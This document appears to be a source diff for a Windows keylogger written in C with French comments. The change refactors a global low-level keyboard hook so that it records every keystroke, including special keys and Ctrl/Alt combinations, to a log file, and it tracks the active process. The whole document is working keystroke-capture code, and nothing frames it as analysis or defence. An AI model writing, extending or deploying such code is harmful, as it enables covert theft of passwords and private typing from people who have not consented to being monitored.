@@ -20,6 +20,8 @@ char    g_last_process[MAX_PATH] = "";  // Dernier processus enregistré
 static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 static void write_to_log(const char* str);
 static void log_new_window(const char* process_name);
+static const char* get_special_key_name(DWORD vkCode);
+static char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn);
 
 // Fonction principale
 int main(void)
@@ -53,7 +55,8 @@ int main(void)
 }
 
 // Fonction de hook pour capturer les frappes
-static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
         KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
         char key[32] = { 0 };
@@ -63,61 +66,32 @@ static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lP
         GetKeyboardState(keyboardState);
 
         // Vérifier l'état de Shift et de Caps Lock
-        BOOL isShiftPressed = GetKeyState(VK_SHIFT) & 0x8000;
+        BOOL isShiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
         BOOL isCapsLockOn = GetKeyState(VK_CAPITAL) & 0x0001;
 
-        // Ignorer les touches Shift, Ctrl, Alt, et Caps Lock pour éviter qu'elles soient loggées sous forme de code
-        /*if (pKeyboard->vkCode == VK_SHIFT || pKeyboard->vkCode == VK_LSHIFT || pKeyboard->vkCode == VK_RSHIFT ||
-            pKeyboard->vkCode == VK_CONTROL || pKeyboard->vkCode == VK_LCONTROL || pKeyboard->vkCode == VK_RCONTROL ||
-            pKeyboard->vkCode == VK_MENU || pKeyboard->vkCode == VK_LMENU || pKeyboard->vkCode == VK_RMENU ||
-            pKeyboard->vkCode == VK_CAPITAL) {
-            return CallNextHookEx(g_hook, nCode, wParam, lParam);
-        }*/
-
-        // Ignorer les touches non imprimables
-        if (pKeyboard->vkCode < 0x20 || pKeyboard->vkCode > 0x7E) {
-            // Inclure des exceptions pour les touches que vous voulez loguer
-            if (pKeyboard->vkCode != VK_RETURN && pKeyboard->vkCode != VK_SPACE &&
-                pKeyboard->vkCode != VK_TAB && pKeyboard->vkCode != VK_BACK) {
-                return CallNextHookEx(g_hook, nCode, wParam, lParam);
-            }
+        if ((pKeyboard->vkCode >= 0x30 && pKeyboard->vkCode <= 0x5A) ||
+			pKeyboard->vkCode >= VK_OEM_1 && pKeyboard->vkCode <= VK_OEM_102 ||
+			pKeyboard->vkCode >= VK_NUMPAD0 && pKeyboard->vkCode <= VK_DIVIDE ||
+            pKeyboard->vkCode == VK_SPACE) {
+			strcpy(key, get_character(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, isShiftPressed, isCapsLockOn));
+		}
+		else { // La touche est une touche spéciale
+			strcpy(key, get_special_key_name(pKeyboard->vkCode));
         }
 
-        switch (pKeyboard->vkCode) {
-        case VK_TAB:
-            strcpy(key, "[Tab]");
-            break;
-        case VK_RETURN:
-            strcpy(key, "[Enter]");
-            break;
-        case VK_BACK:
-            strcpy(key, "[Backspace]");
-            break;
-        default:
-            // Conversion de la touche en fonction de l'état actuel du clavier
-            if (ToAscii(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, (LPWORD)key, 0) == 1) {
-                if ((isShiftPressed && !isCapsLockOn) || (!isShiftPressed && isCapsLockOn)) {
-                    // Convertir en majuscule
-                    key[0] = (char)toupper(key[0]);
-
-                }
-                else if (!isShiftPressed && !isCapsLockOn) {
-                    // Convertir en minuscule
-                    key[0] = (char)tolower(key[0]);
-                }
-            }
-            else {
-                sprintf(key, "[%lu]", pKeyboard->vkCode);
-            }
-            // Ajoutez d'autres touches spéciales ici
-        }
+		if (strcmp(key, "") == 0) {
+			return CallNextHookEx(g_hook, nCode, wParam, lParam);
+		}
 
         // Gérer les combinaisons de touches (e.g., Ctrl+C)
-        if (GetKeyState(VK_CONTROL) & 0x8000) {
-            sprintf(key, "[Ctrl+%c]", key[0]);
+        char tmp_key[32] = { 0 };
+        if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {
+            sprintf(tmp_key, "[Ctrl+%s]", key);
+			strcpy(key, tmp_key);
         }
-        if (GetKeyState(VK_MENU) & 0x8000) {  // Alt key
-            sprintf(key, "[Alt+%c]", key[0]);
+        if (GetAsyncKeyState(VK_MENU) & 0x8000) {  // Alt key
+            sprintf(tmp_key, "[Alt+%s]", key);
+			strcpy(key, tmp_key);
         }
 
         // Écrire la touche dans le fichier log
@@ -167,4 +141,208 @@ static void write_to_log(const char* str)
     }
     fprintf(g_logfile, "%s", str);
     fflush(g_logfile);
+}
+
+static char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn)
+{
+    static char key[2] = { 0 }; // Static pour retourner un pointeur valide
+
+    // Conversion de la touche en fonction de l'état actuel du clavier
+    if (ToAscii(vkCode, scanCode, keyboardState, (LPWORD)key, 0) == 1) {
+        if ((isShiftPressed && !isCapsLockOn) || (!isShiftPressed && isCapsLockOn)) {
+            // Convertir en majuscule
+            key[0] = (char)toupper(key[0]);
+        }
+        else if (!isShiftPressed && !isCapsLockOn) {
+            // Convertir en minuscule
+            key[0] = (char)tolower(key[0]);
+        }
+    }
+    else {
+        return "[Unknown Key]";
+    }
+
+    return key;
+}
+
+static const char* get_special_key_name(DWORD vkCode)
+{
+    switch (vkCode) {
+    case VK_TAB:
+        return "[Tab]";
+    case VK_RETURN:
+        return "[Enter]";
+    case VK_BACK:
+        return "[Backspace]";
+	case VK_CAPITAL:
+		return "";   
+    case VK_ESCAPE:
+        return "[Esc]";
+    case VK_SPACE:
+        return "[Space]";
+    case VK_PRIOR:
+        return "[Page Up]";
+    case VK_NEXT:
+        return "[Page Down]";
+    case VK_END:
+        return "[End]";
+    case VK_HOME:
+        return "[Home]";
+    case VK_LEFT:
+        return "[Left Arrow]";
+    case VK_UP:
+        return "[Up Arrow]";
+    case VK_RIGHT:
+        return "[Right Arrow]";
+    case VK_DOWN:
+        return "[Down Arrow]";
+    case VK_INSERT:
+        return "[Insert]";
+    case VK_DELETE:
+        return "[Delete]";
+    case VK_LWIN:
+        return "[Left Windows]";
+    case VK_RWIN:
+        return "[Right Windows]";
+    case VK_APPS:
+        return "[Application]";
+    case VK_SLEEP:
+        return "[Sleep]";
+    case VK_NUMPAD0:
+        return "[Numpad 0]";
+    case VK_NUMPAD1:
+        return "[Numpad 1]";
+    case VK_NUMPAD2:
+        return "[Numpad 2]";
+    case VK_NUMPAD3:
+        return "[Numpad 3]";
+    case VK_NUMPAD4:
+        return "[Numpad 4]";
+    case VK_NUMPAD5:
+        return "[Numpad 5]";
+    case VK_NUMPAD6:
+        return "[Numpad 6]";
+    case VK_NUMPAD7:
+        return "[Numpad 7]";
+    case VK_NUMPAD8:
+        return "[Numpad 8]";
+    case VK_NUMPAD9:
+        return "[Numpad 9]";
+    case VK_MULTIPLY:
+        return "[Numpad *]";
+    case VK_ADD:
+        return "[Numpad +]";
+    case VK_SEPARATOR:
+        return "[Numpad Separator]";
+    case VK_SUBTRACT:
+        return "[Numpad -]";
+    case VK_DECIMAL:
+        return "[Numpad .]";
+    case VK_DIVIDE:
+        return "[Numpad /]";
+    case VK_F1:
+        return "[F1]";
+    case VK_F2:
+        return "[F2]";
+    case VK_F3:
+        return "[F3]";
+    case VK_F4:
+        return "[F4]";
+    case VK_F5:
+        return "[F5]";
+    case VK_F6:
+        return "[F6]";
+    case VK_F7:
+        return "[F7]";
+    case VK_F8:
+        return "[F8]";
+    case VK_F9:
+        return "[F9]";
+    case VK_F10:
+        return "[F10]";
+    case VK_F11:
+        return "[F11]";
+    case VK_F12:
+        return "[F12]";
+    case VK_NUMLOCK:
+        return "[Num Lock]";
+    case VK_SCROLL:
+        return "[Scroll Lock]";
+    case VK_LSHIFT:
+        return "";
+    case VK_RSHIFT:
+        return "";
+    case VK_LCONTROL:
+        return "";
+    case VK_RCONTROL:
+        return "";
+    case VK_LMENU:
+        return "";
+    case VK_RMENU:
+        return "";
+    case VK_VOLUME_MUTE:
+        return "[Volume Mute]";
+    case VK_VOLUME_DOWN:
+        return "[Volume Down]";
+    case VK_VOLUME_UP:
+        return "[Volume Up]";
+    case VK_MEDIA_NEXT_TRACK:
+        return "[Next Track]";
+    case VK_MEDIA_PREV_TRACK:
+        return "[Previous Track]";
+    case VK_MEDIA_STOP:
+        return "[Stop Media]";
+    case VK_MEDIA_PLAY_PAUSE:
+        return "[Play/Pause Media]";
+    case VK_LAUNCH_MAIL:
+        return "[Launch Mail]";
+    case VK_LAUNCH_MEDIA_SELECT:
+        return "[Launch Media Select]";
+    case VK_LAUNCH_APP1:
+        return "[Launch App 1]";
+    case VK_LAUNCH_APP2:
+        return "[Launch App 2]";
+    case VK_BROWSER_BACK:
+        return "[Browser Back]";
+    case VK_BROWSER_FORWARD:
+        return "[Browser Forward]";
+    case VK_BROWSER_REFRESH:
+        return "[Browser Refresh]";
+    case VK_BROWSER_STOP:
+        return "[Browser Stop]";
+    case VK_BROWSER_SEARCH:
+        return "[Browser Search]";
+    case VK_BROWSER_FAVORITES:
+        return "[Browser Favorites]";
+    case VK_BROWSER_HOME:
+        return "[Browser Home]";
+    case VK_OEM_1:
+        return "[OEM 1 (;:)]";
+    case VK_OEM_PLUS:
+        return "[OEM Plus (+)]";
+    case VK_OEM_COMMA:
+        return "[OEM Comma (,)]";
+    case VK_OEM_MINUS:
+        return "[OEM Minus (-)]";
+    case VK_OEM_PERIOD:
+        return "[OEM Period (.)]";
+    case VK_OEM_2:
+        return "[OEM 2 (/?) ]";
+    case VK_OEM_3:
+        return "[OEM 3 (`~)]";
+    case VK_OEM_4:
+        return "[OEM 4 ([{)]";
+    case VK_OEM_5:
+        return "[OEM 5 (\\|)]";
+    case VK_OEM_6:
+        return "[OEM 6 (]}])]";
+    case VK_OEM_7:
+        return "[OEM 7 ('\") ]";
+    case VK_OEM_8:
+        return "[OEM 8]";
+    case VK_OEM_102:
+        return "[OEM 102 (<|>)]";
+    default:
+        return "[Unknown Key]";
+    }
 }
